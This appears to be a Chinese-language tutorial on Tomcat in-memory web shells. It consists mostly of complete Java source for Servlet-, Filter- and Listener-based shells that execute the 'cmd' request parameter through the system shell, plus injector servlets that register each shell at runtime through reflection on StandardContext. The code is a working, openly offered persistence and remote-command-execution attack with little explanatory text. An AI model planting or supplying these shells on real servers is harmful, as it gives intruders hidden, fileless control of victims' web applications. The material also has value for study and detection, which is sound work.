## Servelet

1. 首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象）。

2. 注册一个Servlet对象并重写其Service方法，在其中实现命令执行并通过response返回

3. 创建Wrapper对象并利用各个船舰的Servlet来初始化

4. 为Wrapper添加路由映射

**ServletShell**:

```java
//@WebServlet(name="shell",value = "/shell")
public class ServletShell extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        if(request.getParameter("cmd")!=null){
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK":"UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2]=request.getParameter("cmd");
            InputStream in = Runtime.getRuntime().exec(commands).getInputStream();
            Scanner s = new Scanner(in,charsetName).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            response.getWriter().write(output);
            response.getWriter().flush();
        }
    }
}
```

**AddServletShell**：

```java
@WebServlet("/addServlet")
public class AddServletShell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws  IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备内存马
            ServletShell shell = new ServletShell();

            //用wrapper包装内存马
            Wrapper wrapper = new StandardWrapper();
            wrapper.setServlet(shell);
            wrapper.setName("servletShell");
            //设置加载顺序
            //wrapper.setLoadOnStartup(1);
            //设置servlet全限定名，可以不设置
            wrapper.setServletClass(shell.getClass().getName());

            //添加到标准上下文
            standardContext.addChild(wrapper);

            //添加映射关系
            standardContext.addServletMappingDecoded("/servletShell","servletShell");

            resp.getWriter().write("add servletShell success!");
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add servletShell failed!");
    }
}
```

## filter

1. 首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象）
2. 利用获取的上下文StandardContext对象获取filterconfigs对象
3. 创建一个恶意Filter对象并重写其doFilter方法，在其中实现命令执行并通过response返回，最后filterChain传入后面的filter
4. 创建FilterDef对象并利用刚刚创建的Filter对象来初始化，并新建一个FilterMap对象，为创建的FilterDef对象添加URL映射
5. 利用创建FilterConfig对象并使用刚刚创建的FilterDef对象初始化，最后将其加入FilterConfigs里面，等待filterChain.dofilter调用

**FilterShell**

```java
public class FilterShell implements Filter {
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        if (request.getParameter("cmd") != null) {
            String[] commands = new String[3];
            String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                commands[0] = "cmd";
                commands[1] = "/c";
            } else {
                commands[0] = "/bin/sh";
                commands[1] = "-c";
            }
            commands[2] = request.getParameter("cmd");
            InputStream in = Runtime.getRuntime().exec(commands).getInputStream();
            Scanner s = new Scanner(in, charsetName).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            System.out.println(output);
            response.getWriter().write(output);
            response.getWriter().flush();
        }
        filterChain.doFilter(request, response);
    }
}
```

**AddFilterShell**

```java
@WebServlet("/addFilter")
public class AddFilterShell extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备filter马
            FilterShell filterShell = new FilterShell();

            //拿到关键的三个对象
            Field filterDefsField = standardContext.getClass().getDeclaredField("filterDefs");
            filterDefsField.setAccessible(true);
            Field filterMapsField = standardContext.getClass().getDeclaredField("filterMaps");
            filterMapsField.setAccessible(true);
            Field filterConfigsField = standardContext.getClass().getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);

            //用def包装filter
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filterShell);
            filterDef.setFilterName(filterShell.getClass().getName());
            filterDef.setFilterClass(filterShell.getClass().getName());

            //添加到上下文
            standardContext.addFilterDef(filterDef);

            //配置映射关系
            FilterMap filterMap = new FilterMap();

            filterMap.setFilterName(filterShell.getClass().getName());
            filterMap.addURLPattern("/helloServlet");

            standardContext.addFilterMapBefore(filterMap);
            
            Class<?> ac = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");

            Constructor constructor = ac.getDeclaredConstructor(org.apache.catalina.Context.class,org.apache.tomcat.util.descriptor.web.FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

            //添加到filterConfigs
            Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)filterConfigsField.get(standardContext);
            filterConfigs.put(filterShell.getClass().getName(),filterConfig);

            //改modifiers
            Field modifiers = filterConfigsField.getClass().getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(filterConfigsField,filterConfigsField.getModifiers() & ~Modifier.FINAL);

            //还原filterConfigs,可以不做，用的是一个引用
            filterConfigsField.set(standardContext,filterConfigs);


            resp.getWriter().write("add FilterShell success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");
    }
}
```

## listen

1. 首先通过反射，从request中获取Tomcat中控制Web应用的Context（StandardContext对象）
2. 创建一个ServletRequestListener对象并重写其requestDestroyed方法，在其中实现命令执行并通过response回显.
3. 将创建的ServletRequestListener对象通过StandardContext添加到事件监听中去

**ListenerShell**

```java
public class ListenerShell implements ServletRequestListener {
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try {
            RequestFacade req = (RequestFacade) servletRequestEvent.getServletRequest();
            Field requestField= req.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            Request request = (Request) requestField.get(req);
            Response response = request.getResponse();
            if (request.getParameter("cmd") != null) {
                String[] commands = new String[3];
                String charsetName = System.getProperty("os.name").toLowerCase().contains("window") ? "GBK" : "UTF-8";
                if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                    commands[0] = "cmd";
                    commands[1] = "/c";
                } else {
                    commands[0] = "/bin/sh";
                    commands[1] = "-c";
                }
                commands[2] = request.getParameter("cmd");
                InputStream in = Runtime.getRuntime().exec(commands).getInputStream();
                Scanner s = new Scanner(in, charsetName).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                System.out.println(output);
                response.getWriter().write(output);
                response.getWriter().flush();
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**AddListenerShell**

```java
@WebServlet("/addListener")
public class AddListenerShell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备listener马
            ListenerShell listenerShell = new ListenerShell();
            //添加到上下文
            standardContext.addApplicationEventListener(listenerShell);

            resp.getWriter().write("add listenerShell success!");
            return;

        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
```